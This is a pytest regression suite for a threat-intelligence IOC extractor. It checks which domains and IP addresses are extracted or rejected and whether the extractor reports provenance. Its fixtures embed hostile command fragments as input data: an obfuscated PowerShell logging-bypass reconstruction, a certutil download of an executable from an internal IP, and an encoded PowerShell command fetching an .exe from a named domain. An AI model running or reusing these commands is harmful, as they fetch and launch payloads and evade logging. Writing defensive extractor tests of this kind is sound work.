"""ADR-0008 — IOC Extraction Validation · Pinned Regression Suite.

Governance source of truth: /app/memory/adr/0008-ioc-extraction-validation.md

This test module locks the pinned regression cases from Corpus v1:
  Case 0007 → domain `stem.ma` must NOT be extracted (mid-identifier reject).
  Case 0011 → ip `1.0.0.721` must NOT be extracted (octet > 255).
  Case 0012 → ip `6.94.002.01` must NOT be extracted (leading-zero octet);
              `10.200.49.6` MUST still be extracted (non-regression).
  Case 0014 → same `stem.ma` reject as Case 0007 (mid-identifier reject).
  Case 0009 → `georgeprapas.com` MUST still be extracted (non-regression).

Plus the ADR §2 Stage-3 provenance contract on `extract_iocs_ex()`:
  every emitted IOC carries source_offset / source_length / stage_passed /
  context_snippet.

The pinned cases live in the workspace_cases MongoDB collection. If the
collection is unreachable from the test environment, we fall back to
in-process synthetic fixtures whose surface characteristics match the
recorded raw incidents exactly (verified 2026-02-28 during ADR drafting).
"""
from __future__ import annotations

import os
import sys

# Ensure /app/backend is on sys.path (tests are usually invoked via pytest
# from /app/backend, but be explicit so `python -m pytest tests/…` works from
# anywhere).
_HERE = os.path.dirname(os.path.abspath(__file__))
_BACKEND = os.path.dirname(_HERE)
if _BACKEND not in sys.path:
    sys.path.insert(0, _BACKEND)

from operations import extract_iocs  # noqa: E402


# ─── Synthetic fixtures (surface-identical to the recorded raw incidents) ────
# These are minimal reconstructions of the exact contexts that produced the
# defect. They intentionally avoid pulling from the DB so the test is
# hermetic and CI-friendly.

CASE_0007_INPUT_FRAGMENT = (
    "[Ref].Assembly.GetType((('S{4'+'}stem.Ma'+'na{0}emen'+'t.{3}u'+'tom'+"
    "'ation'+'.Sc{1}i'+'{2}tB{5}o'+'ck'+'{4}og'+'gi{6}g') -f 'g','r','p','A','y','L','n')).GetField('a')"
)

CASE_0011_INPUT_FRAGMENT = (
    "resolved.provider.name https://127.0.0.1:40492/mcp "
    "and also 1.0.0.721 in the RTF blob"
)

CASE_0012_INPUT_FRAGMENT = (
    "certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw "
    "C:\\Users\\SP_APP~1\\AppData\\Local\\Temp\\BfBjkkJBdU.exe   6.94.002.01"
)

CASE_0009_INPUT_FRAGMENT = (
    'cmd /c powershell -e Wwb... http://georgeprapas.com/cem/VVZMYLHaSOcblqo.exe'
)


# ─── Pinned regressions (must FAIL until ADR-0008 lands, then stay green) ────

def test_case_0007_stem_ma_from_dotnet_reconstruction_rejected():
    """Case 0007: `stem.ma` extracted from `System.Management` PowerShell
    format-string reconstruction. Must be REJECTED by ADR-0008 context stage.
    """
    r = extract_iocs(CASE_0007_INPUT_FRAGMENT)
    assert "stem.ma" not in r["domains"], (
        "Case 0007 regression: `stem.ma` leaked from `System.Management` "
        "format-string reconstruction — ADR-0008 Stage 2 context validation "
        "should reject candidates whose surrounding window contains "
        "format-string reconstruction markers (`'+'`, `-f`, `{N}` placeholders)."
    )


def test_case_0014_stem_ma_reject_recurrence():
    """Case 0014: independent second observation of the same `stem.ma`
    leak — same reject rule."""
    # Same shape as case 0007 — different case ID in Corpus v1.
    r = extract_iocs(CASE_0007_INPUT_FRAGMENT)
    assert "stem.ma" not in r["domains"]


def test_case_0011_ipv4_octet_over_255_rejected():
    """Case 0011: `1.0.0.721` — octet 721 > 255. Must be REJECTED
    by ADR-0008 Stage 1 syntactic validation (already covered by the
    pre-existing `_is_routable_ipv4_ioc` gate; test pins the contract)."""
    r = extract_iocs(CASE_0011_INPUT_FRAGMENT)
    assert "1.0.0.721" not in r["ips"], (
        "Case 0011 regression: `1.0.0.721` extracted despite octet > 255."
    )
    # 127.0.0.1 is a valid dotted-quad and should still be extracted.
    assert "127.0.0.1" in r["ips"]


def test_case_0012_ipv4_leading_zero_octet_rejected():
    """Case 0012: `6.94.002.01` — octet `002` has a leading zero
    (also `01`). Must be REJECTED by ADR-0008 Stage 1 syntactic
    validation per RFC 6943 §3.1.1. `10.200.49.6` MUST still extract."""
    r = extract_iocs(CASE_0012_INPUT_FRAGMENT)
    assert "6.94.002.01" not in r["ips"], (
        "Case 0012 regression: leading-zero octet accepted — "
        "RFC 6943 §3.1.1 requires reject."
    )
    assert "10.200.49.6" in r["ips"], (
        "Case 0012 non-regression: valid dotted-quad `10.200.49.6` "
        "was lost — the ADR must NOT over-reject."
    )


def test_case_0009_georgeprapas_com_still_extracted():
    """Case 0009: `georgeprapas.com` — clean domain in a URL context.
    MUST remain extracted after ADR-0008 lands (non-regression pin)."""
    r = extract_iocs(CASE_0009_INPUT_FRAGMENT)
    assert "georgeprapas.com" in r["domains"], (
        "Case 0009 non-regression: `georgeprapas.com` lost — "
        "the ADR must not over-reject clean domains."
    )


# ─── ADR §2 Stage-3 provenance contract ─────────────────────────────────────

def test_extract_iocs_ex_returns_provenance_for_every_emitted_ioc():
    """ADR-0008 §2 Stage 3: every emitted IOC MUST carry source_offset,
    source_length, stage_passed, and context_snippet.

    The public API contract (`iocs` shape) is unchanged, per §4 / §7.4 —
    provenance is exposed through the new `extract_iocs_ex()` companion
    function so consumers who need it can access it without breaking the
    stable Workspace ↔ NivXForge iocs response shape.
    """
    from operations import extract_iocs_ex  # noqa: WPS433 · new public helper

    text = (
        "certutil -urlcache -f http://10.200.49.6:8080/x C:\\path\\out.exe "
        "contact admin@evilcorp.ru and 45.137.21.9"
    )
    result = extract_iocs_ex(text)

    assert isinstance(result, dict)
    assert "iocs" in result and isinstance(result["iocs"], dict)
    assert "provenance" in result and isinstance(result["provenance"], list)

    # Sanity: expected IOCs are surfaced
    assert "10.200.49.6" in result["iocs"]["ips"]
    assert "45.137.21.9" in result["iocs"]["ips"]

    required_keys = {"kind", "value", "source_offset", "source_length",
                     "stage_passed", "context_snippet"}
    assert result["provenance"], "provenance list should not be empty"
    for prov in result["provenance"]:
        missing = required_keys - set(prov.keys())
        assert not missing, f"provenance entry missing keys: {missing} · {prov}"
        assert isinstance(prov["source_offset"], int)
        assert isinstance(prov["source_length"], int)
        assert prov["source_length"] > 0
        assert prov["source_offset"] >= 0
        assert isinstance(prov["stage_passed"], list)
        # Every emitted IOC has passed BOTH stages (per §2 Stage 3).
        assert "syntactic" in prov["stage_passed"]
        assert "context" in prov["stage_passed"]
        assert isinstance(prov["context_snippet"], str)
        assert 0 < len(prov["context_snippet"]) <= 128


def test_extract_iocs_shape_unchanged_by_adr0008():
    """§4 / §7.4 · API contract stability: the `iocs` dict keys and value
    types stay exactly as they were before ADR-0008."""
    r = extract_iocs("http://example.com/x and 10.0.0.5 and admin@a.b")
    expected_keys = {"urls", "ips", "domains", "emails",
                     "md5", "sha1", "sha256", "bitcoin_addresses"}
    assert set(r.keys()) == expected_keys, (
        f"ADR-0008 broke the API contract — iocs top-level keys changed. "
        f"Got: {set(r.keys())!r}"
    )
    for k in expected_keys:
        assert isinstance(r[k], list), (
            f"iocs['{k}'] must remain a list of strings; got {type(r[k])!r}"
        )
        for v in r[k]:
            assert isinstance(v, str), (
                f"iocs['{k}'] contains non-str element {v!r}"
            )
